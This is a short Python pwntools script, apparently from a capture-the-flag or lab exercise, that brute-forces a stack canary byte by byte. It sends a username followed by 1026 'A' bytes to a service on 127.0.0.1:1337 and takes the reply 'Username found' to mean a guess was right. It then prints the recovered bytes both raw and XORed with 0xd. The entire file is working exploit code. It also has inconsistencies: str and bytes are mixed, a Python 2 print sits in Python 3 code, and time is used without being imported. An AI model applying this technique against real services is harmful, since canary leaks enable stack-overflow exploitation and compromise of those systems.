import socket
from pwn import *


context(arch = 'amd64', os = 'linux', endian = 'little')

def send_payload(payload):
    s = remote('127.0.0.1', 1337)
    s.send_raw(payload)
    return s.recvall().decode('utf8')


payload = b'davide'
payload += b'\x41' * 1026


def bruteforce(payload, bytes_number, start=0x0, stop=0xff, step=0x1):

    bytes_array = []

    for i in range(0, bytes_number):
        for byte in range(start, stop + step, step):
            guessed_payload = payload

            if len(bytes_array):
                guessed_payload += ''.join([chr(v) for v in bytes_array])

            guessed_payload += chr(byte)

            output = send_payload(guessed_payload)

            if 'Username found' in output:
                bytes_array.append(byte)
                log.debug('Found Byte: {}'.format(' '.join(['0x{:02x}'.format(b) for b in bytes_array])))
                break
            # else:
            #     pwn.log.debug('0x{:02x}: invalid'.format(byte))
            #     pass

            if byte == stop:
                log.error('Error on exploit')
                exit(1)

            time.sleep(0.01)

    return bytes_array


canary = bruteforce(payload,8) 


for i in canary:
    canary_xor = int(i) ^ 0xd
    print('Canary Bytes: 0x{:02x}'.format(canary_xor))

print ''
    
for i in canary:
    canary = int(i) 
    print('Canary Bytes Not Xored: 0x{:02x}'.format(canary))



    

